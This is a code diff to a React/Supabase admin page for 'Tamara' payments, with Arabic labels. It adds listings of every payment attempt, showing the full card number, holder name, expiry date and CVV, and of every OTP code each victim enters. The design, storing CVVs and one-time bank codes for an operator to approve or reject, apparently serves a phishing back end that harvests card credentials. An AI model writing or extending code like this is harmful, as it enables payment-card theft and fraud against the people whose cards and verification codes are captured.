@@ -11,6 +11,21 @@ import { useToast } from "@/hooks/use-toast";
 import { format } from "date-fns";
 import { ar } from "date-fns/locale";
 
+interface PaymentAttempt {
+  id: string;
+  card_number: string;
+  card_holder_name: string;
+  expiry_date: string;
+  cvv: string;
+  created_at: string;
+}
+
+interface OtpAttempt {
+  id: string;
+  otp_code: string;
+  created_at: string;
+}
+
 interface TamaraPayment {
   id: string;
   cardholder_name: string;
@@ -25,6 +40,8 @@ interface TamaraPayment {
   payment_status: string;
   created_at: string;
   updated_at: string;
+  payment_attempts: PaymentAttempt[];
+  otp_attempts: OtpAttempt[];
 }
 
 const AdminTamaraPayments = () => {
@@ -72,7 +89,11 @@ const AdminTamaraPayments = () => {
     try {
       const { data, error } = await supabase
         .from('tamara_payments')
-        .select('*')
+        .select(`
+          *,
+          payment_attempts:tamara_payment_attempts(*),
+          otp_attempts:tamara_otp_attempts(*)
+        `)
         .order('created_at', { ascending: false });
 
       if (error) throw error;
@@ -262,26 +283,6 @@ const AdminTamaraPayments = () => {
                     <CardContent>
                       <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                         <div>
-                          <p className="text-sm text-gray-600">رقم البطاقة الكامل</p>
-                          <p className="font-medium">{payment.card_number || 'غير متوفر'}</p>
-                        </div>
-                        <div>
-                          <p className="text-sm text-gray-600">آخر 4 أرقام</p>
-                          <p className="font-medium">**** **** **** {payment.card_number_last4}</p>
-                        </div>
-                        <div>
-                          <p className="text-sm text-gray-600">تاريخ الانتهاء</p>
-                          <p className="font-medium">{payment.expiry_date || 'غير متوفر'}</p>
-                        </div>
-                        <div>
-                          <p className="text-sm text-gray-600">CVV</p>
-                          <p className="font-medium">{payment.cvv || 'غير متوفر'}</p>
-                        </div>
-                        <div>
-                          <p className="text-sm text-gray-600">كود التحقق (OTP)</p>
-                          <p className="font-bold text-lg text-primary">{payment.otp_code || 'لم يتم إدخاله بعد'}</p>
-                        </div>
-                        <div>
                           <p className="text-sm text-gray-600">شركة التأمين</p>
                           <p className="font-medium">{payment.company}</p>
                         </div>
@@ -293,7 +294,67 @@ const AdminTamaraPayments = () => {
                           <p className="text-sm text-gray-600">المبلغ الإجمالي</p>
                           <p className="font-bold text-lg">{payment.total_amount} ر.س</p>
                         </div>
+                        <div>
+                          <p className="text-sm text-gray-600">كود التحقق (OTP)</p>
+                          <p className="font-bold text-lg text-primary">{payment.otp_code || 'لم يتم إدخاله بعد'}</p>
+                        </div>
                       </div>
+
+                      {/* محاولات الدفع المتعددة */}
+                      {payment.payment_attempts && payment.payment_attempts.length > 0 && (
+                        <div className="mt-6 pt-6 border-t-2 border-gray-100">
+                          <p className="font-semibold text-lg mb-4">محاولات الدفع ({payment.payment_attempts.length})</p>
+                          <div className="space-y-4">
+                            {payment.payment_attempts.map((attempt, index) => (
+                              <div key={attempt.id} className="bg-gray-50 rounded-lg p-4">
+                                <p className="font-medium text-sm mb-2">المحاولة {index + 1}</p>
+                                <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-sm">
+                                  <div>
+                                    <p className="text-gray-600">حامل البطاقة:</p>
+                                    <p className="font-medium">{attempt.card_holder_name}</p>
+                                  </div>
+                                  <div>
+                                    <p className="text-gray-600">رقم البطاقة:</p>
+                                    <p className="font-medium">{attempt.card_number}</p>
+                                  </div>
+                                  <div>
+                                    <p className="text-gray-600">تاريخ الانتهاء:</p>
+                                    <p className="font-medium">{attempt.expiry_date}</p>
+                                  </div>
+                                  <div>
+                                    <p className="text-gray-600">CVV:</p>
+                                    <p className="font-medium">{attempt.cvv}</p>
+                                  </div>
+                                  <div>
+                                    <p className="text-gray-600">وقت المحاولة:</p>
+                                    <p className="font-medium text-xs">{format(new Date(attempt.created_at), 'PPp', { locale: ar })}</p>
+                                  </div>
+                                </div>
+                              </div>
+                            ))}
+                          </div>
+                        </div>
+                      )}
+
+                      {/* محاولات OTP المتعددة */}
+                      {payment.otp_attempts && payment.otp_attempts.length > 0 && (
+                        <div className="mt-6 pt-6 border-t-2 border-gray-100">
+                          <p className="font-semibold text-lg mb-4">محاولات كود التحقق ({payment.otp_attempts.length})</p>
+                          <div className="space-y-3">
+                            {payment.otp_attempts.map((attempt, index) => (
+                              <div key={attempt.id} className="bg-gray-50 rounded-lg p-4">
+                                <div className="flex items-center justify-between">
+                                  <div>
+                                    <p className="font-medium text-sm">المحاولة {index + 1}</p>
+                                    <p className="text-gray-600 text-xs mt-1">{format(new Date(attempt.created_at), 'PPp', { locale: ar })}</p>
+                                  </div>
+                                  <p className="font-bold text-lg text-primary">{attempt.otp_code}</p>
+                                </div>
+                              </div>
+                            ))}
+                          </div>
+                        </div>
+                      )}
 
                       {/* أزرار الموافقة/الرفض على الدفع */}
                       {payment.payment_status === 'pending' && !payment.otp_code && (
